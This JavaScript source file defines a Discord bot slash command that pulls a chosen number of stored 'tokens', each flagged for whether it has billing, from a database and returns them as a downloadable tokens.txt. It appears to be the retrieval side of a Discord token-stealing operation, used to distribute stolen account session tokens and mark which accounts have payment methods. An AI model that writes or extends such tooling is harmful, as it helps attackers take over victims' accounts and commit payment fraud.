const { SlashCommandBuilder } = require("@discordjs/builders");

const con = require("../db.js");

const { tokenListGenerated } = require("../logs");

module.exports = {
  data: new SlashCommandBuilder()
    .setName("tokens")
    .setDescription("Get's tokens from the database.")
    .addIntegerOption((option) =>
      option
        .setName("limit")
        .setDescription("How many tokens to get. Ordered by most recent.")
        .setRequired(true)
    ),
  async execute(interaction) {
    const username = interaction.user.username;
    const discriminator = interaction.user.discriminator;
    const user = username + "#" + discriminator;
    const limit = interaction.options.getInteger("limit");
    const billing = interaction.options.getBoolean("billing");
    tokenListGenerated(user, limit);
    if (limit > 10000) {
      await interaction.reply({
        content: ":x: Limit is too high",
      });
      return;
    }
    console.log("Getting tokens for: " + user + " with limit: " + limit);

    con.query(
      "SELECT token,hasBilling FROM tokens WHERE guildId = ? ORDER BY addedAt DESC LIMIT ?",
      [interaction.guild.id, limit],
      (err, result) => {
        if (err) throw err;

        if (result.length > 0) {
          let tokens = result.map((token) => {
            return token.token;
          });
          tokens = tokens.join("\n");
          interaction.reply({
            files: [
              {
                attachment: Buffer.from(tokens),
                name: "tokens.txt",
              },
            ],
            ephemeral: true,
          });
        } else {
          interaction.reply({
            content: "No tokens found.",
            ephemeral: true,
          });
        }
      }
    );
  },
};
